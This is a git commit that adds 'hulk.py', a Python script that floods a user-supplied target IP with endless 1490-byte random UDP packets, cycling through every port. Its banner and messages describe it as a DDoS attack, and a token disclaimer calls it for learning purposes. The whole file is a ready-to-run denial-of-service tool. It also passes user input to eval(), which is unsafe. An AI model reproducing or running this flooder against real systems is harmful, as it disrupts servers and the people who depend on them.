1f4ce5ead1ce10c7371fcb3c1cfda110c0dc82b5
Sumalya Chatterjee <105884682+R3DHULK@users.noreply.github.com>
2022-11-03 17:51:38 +0000

    Add files via upload

---
+++ hulk.py
@@ -0,0 +1,68 @@
+#Lets import modules
+import sys
+import os
+import time
+import socket
+import scapy.all as scapy
+import random
+import threading
+
+#Lets start coding
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+#Lets define sock and bytes
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+os.system("clear")
+#Banner :
+print('''
+    ************************************************
+    *            _  _ _   _ _    _  __             *
+    *           | || | | | | |  | |/ /             * 
+    *           | __ | |_| | |__| ' <              *
+    *           |_||_|\___/|____|_|\_\             *
+    *                                              *
+    *          HTTP Unbearable Load King           *
+    *          Author: Sumalya Chatterjee          *
+    *                                              *
+    ************************************************
+    ************************************************
+    *                                              *    
+    *  [!] Disclaimer :                            *
+    *  1. Don't Use For Personal Revenges          *
+    *  2. Author Is Not Responsible For Your Jobs  *
+    *  3. Use for learning purposes                * 
+    *  4. Does HULK suit in villain role, huh?     *
+    ************************************************
+	''')
+#Type your ip and port number (find IP address using nslookup or any online website) 
+ip = input(" [+] Give HULK A Target IP : ")
+port = eval(input(" [+] Starting Port NO : "))
+
+#Lets start our attack
+print(" ")
+print("    That's my secret Cap, I am always angry ")
+print(" " )
+print(" [+] HULK is attacking server " + ip )
+print (" " )
+time.sleep(5)
+sent = 0
+try :
+ while True:
+		sock.sendto(bytes, (ip, port))
+		sent = sent + 1
+		port = port + 1
+		print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
+		if port == 65534:
+			port = 1
+except KeyboardInterrupt:
+	print(" ")
+	print("\n [-] Ctrl+C Detected.........Exiting")
+	print(" [-] DDOS ATTACKING STOPPED")
+input("Enter To Exit")
